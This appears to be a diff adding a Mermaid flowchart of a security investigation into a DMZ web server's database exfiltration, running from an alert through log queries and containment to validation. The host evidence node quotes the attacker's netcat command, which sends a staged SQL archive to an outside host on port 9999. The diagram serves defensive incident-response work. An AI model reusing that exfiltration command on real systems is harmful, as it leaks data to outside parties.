@@ -1,0 +1,60 @@
+graph TD
+    %% -------------------------------------------------------------
+    %% CASE 005: DMZ EXFILTRATION & REMEDIATION INVESTIGATION FLOW
+    %% -------------------------------------------------------------
+
+    subgraph TRIAGE["1. INITIAL ALERT TRIAGE"]
+        ALERT_A13["ESM Alert: A13 DMZ Exfil Transfer<br/>Severity: 10 (Critical)<br/>Source: 10.10.34.13 (WEB01) ──► Target: 203.0.113.25:9999"]
+        SURICATA_SID["Suricata Custom Signature SID 1101021<br/>Action: allowed (Passive Inspection)"]
+    end
+
+    subgraph PIVOT_NETWORK["2. VOLUMETRIC FLOW ANALYSIS (LOGGER)"]
+        QUERY_FLOW["Logger Query: Zeek & Suricata Flow Logs<br/>Target: TCP/9999 from WEB01"]
+        EVID_STREAM["High-Velocity Egress Stream Confirmed<br/>Volume: 4,194,304 bytes (4.19 MB)<br/>Duration: 3.42 seconds"]
+    end
+
+    subgraph PIVOT_HOST["3. HOST PROCESS CORROBORATION (LOGGER)"]
+        QUERY_BASH["Logger Query: Linux Command History<br/>Examine commands executed on WEB01"]
+        EVID_NC["Netcat Execution Confirmed<br/>nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz"]
+        CORRELATE_DUMP["Correlate Archive Size<br/>Transferred 4.19 MB matches staged DB archive"]
+    end
+
+    subgraph CONTAINMENT["4. EMERGENCY INCIDENT CONTAINMENT"]
+        EGRESS_BLOCK["Perimeter Egress Firewall Rule<br/>pfSense Block TCP Outbound to Port 9999"]
+        KILL_SESSIONS["Process & Session Eradication<br/>pkill nc & terminate pts/1 SSH session"]
+        PURGE_STAGE["Staged File Eradication<br/>rm -f /tmp/*.sql* on WEB01"]
+        ISOLATE_HOST["Temporary Network Quarantine<br/>Sever WEB01 virtual interface from DMZ"]
+    end
+
+    subgraph VALIDATION["5. REMEDIATION VALIDATION"]
+        QUERY_FW["Logger Query: pfSense Filterlog<br/>Check post-containment connection attempts"]
+        CONFIRM_DROP["Validation Confirmed<br/>Subsequent port 9999 SYN packets dropped (action=block)"]
+    end
+
+    %% Connections
+    ALERT_A13 --> SURICATA_SID
+    SURICATA_SID --> QUERY_FLOW
+    QUERY_FLOW --> EVID_STREAM
+    EVID_STREAM --> QUERY_BASH
+    QUERY_BASH --> EVID_NC
+    EVID_NC --> CORRELATE_DUMP
+
+    CORRELATE_DUMP --> EGRESS_BLOCK
+    CORRELATE_DUMP --> KILL_SESSIONS
+    CORRELATE_DUMP --> PURGE_STAGE
+    CORRELATE_DUMP --> ISOLATE_HOST
+
+    EGRESS_BLOCK --> QUERY_FW
+    QUERY_FW --> CONFIRM_DROP
+
+    classDef alert fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#b71c1c;
+    classDef network fill:#e1f5fe,stroke:#0288d1,stroke-width:1px,color:#01579b;
+    classDef host fill:#f3e5f5,stroke:#7b1fa2,stroke-width:1px,color:#4a148c;
+    classDef response fill:#fff3e0,stroke:#e65100,stroke-width:1px,color:#bf360c;
+    classDef valid fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px,color:#1b5e20;
+
+    class ALERT_A13,SURICATA_SID alert;
+    class QUERY_FLOW,EVID_STREAM network;
+    class QUERY_BASH,EVID_NC,CORRELATE_DUMP host;
+    class EGRESS_BLOCK,KILL_SESSIONS,PURGE_STAGE,ISOLATE_HOST response;
+    class QUERY_FW,CONFIRM_DROP valid;
